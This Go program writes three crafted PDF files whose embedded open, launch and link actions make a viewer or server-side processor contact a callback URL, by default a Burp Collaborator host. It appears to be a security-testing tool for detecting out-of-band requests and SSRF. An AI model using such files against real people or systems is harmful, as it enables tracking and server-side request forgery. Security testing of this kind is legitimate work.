package main

import (
	"flag"
	"fmt"
	"os"
)

func writeContentToFile(filecontent string, filename string) {
	f, err := os.Create(filename)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	writefile, _ := f.WriteString(filecontent)
	fmt.Printf("wrote %d bytes\n", writefile)
}

func generatePDF3(callback string, filename string) {
	filecontent := "%PDF-1.7\n1 0 obj\n  << /Type /Catalog\n     /Pages 2 0 R\n  >>\nendobj\n2 0 obj\n  << /Type /Pages\n     /Kids [3 0 R]\n     /Count 1\n     /MediaBox [0 0 595 842]\n  >>\nendobj\n3 0 obj\n  << /Type /Page\n     /Parent 2 0 R\n     /Resources\n      << /Font\n          << /F1\n              << /Type /Font\n                 /Subtype /Type1\n                 /BaseFont /Courier\n              >>\n          >>\n      >>\n     /Annots [<< /Type /Annot\n                 /Subtype /Link\n                 /Open true\n                 /A 5 0 R\n                 /H /N\n                 /Rect [0 0 595 842]\n              >>]\n     /Contents [4 0 R]\n  >>\nendobj\n4 0 obj\n  << /Length 67 >>\nstream\n  BT\n    /F1 22 Tf\n    30 800 Td\n    (Testcase: 'uri'     ) Tj\n  ET\nendstream\nendobj\n5 0 obj\n  << /Type /Action\n     /S /URI\n     /URI (" + callback + "/test5)\n  >>\nendobj\nxref\n0 6\n0000000000 65535 f\n0000000010 00000 n\n0000000069 00000 n\n0000000170 00000 n\n0000000629 00000 n\n0000000749 00000 n\ntrailer\n  << /Root 1 0 R\n     /Size 6\n  >>\nstartxref\n854\n%%EOF"
	writeContentToFile(filecontent, filename)
}

func generatePDF2(callback string, filename string) {
	filecontent := "%PDF-1.7\n1 0 obj\n  << /Type /Catalog\n     /Pages 2 0 R\n  >>\nendobj\n2 0 obj\n  << /Type /Pages\n     /Kids [3 0 R]\n     /Count 1\n     /MediaBox [0 0 595 842]\n  >>\nendobj\n3 0 obj\n  << /Type /Page\n     /Parent 2 0 R\n     /Resources\n      << /Font\n          << /F1\n              << /Type /Font\n                 /Subtype /Type1\n                 /BaseFont /Courier\n              >>\n          >>\n      >>\n     /Annots [<< /Type /Annot\n                 /Subtype /Link\n                 /Open true\n                 /A 5 0 R\n                 /H /N\n                 /Rect [0 0 595 842]\n              >>]\n     /Contents [4 0 R]\n  >>\nendobj\n4 0 obj\n  << /Length 67 >>\nstream\n  BT\n    /F1 22 Tf\n    30 800 Td\n    (Testcase: 'launch'  ) Tj\n  ET\nendstream\nendobj\n5 0 obj\n  << /Type /Action\n     /S /Launch\n     /F << /Type /FileSpec /F (" + callback + "/test6.pdf) /V true /FS /URL >>\n     /NewWindow false\n  >>\nendobj\nxref\n0 6\n0000000000 65535 f\n0000000010 00000 n\n0000000069 00000 n\n0000000170 00000 n\n0000000629 00000 n\n0000000749 00000 n\ntrailer\n  << /Root 1 0 R\n     /Size 6\n  >>\nstartxref\n922\n%%EOF"
	writeContentToFile(filecontent, filename)
}

func generatePDFs(callback string, filename string) {
	filecontent := "%PDF-1.7\n1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>\nendobj\nxref\n0 4\n0000000000 65535 f\n0000000015 00000 n\n0000000060 00000 n\n0000000111 00000 n\ntrailer\n<</Size 4/Root 1 0 R>>\nstartxref\n190\n3 0 obj\n<< /Type /Page\n   /Contents 4 0 R\n   /AA <<\n	   /O <<\n		  /F (" + callback + ")\n		  /D [ 0 /Fit]\n		  /S /GoToE\n		  >>\n	   >>\n	   /Parent 2 0 R\n	   /Resources <<\n			/Font <<\n				/F1 <<\n					/Type /Font\n					/Subtype /Type1\n					/BaseFont /Helvetica\n					>>\n				  >>\n				>>\n>>\nendobj\n4 0 obj<< /Length 100>>\nstream\nBT\n/TI_0 1 Tf\n14 0 0 14 10.000 753.976 Tm\n0.0 0.0 0.0 rg\n(PDF Document) Tj\nET\nendstream\nendobj\ntrailer\n<<\n	/Root 1 0 R\n>>\n%%EOF"
	writeContentToFile(filecontent, filename)
}

func main() {
	url := flag.String("url", "testing.burpcollaborator.net", "Collaborator URL")
	flag.Parse()
	callback := *url
	generatePDFs(callback, "test.pdf")
	generatePDF2(callback, "test2.pdf")
	generatePDF3(callback, "test3.pdf")
}
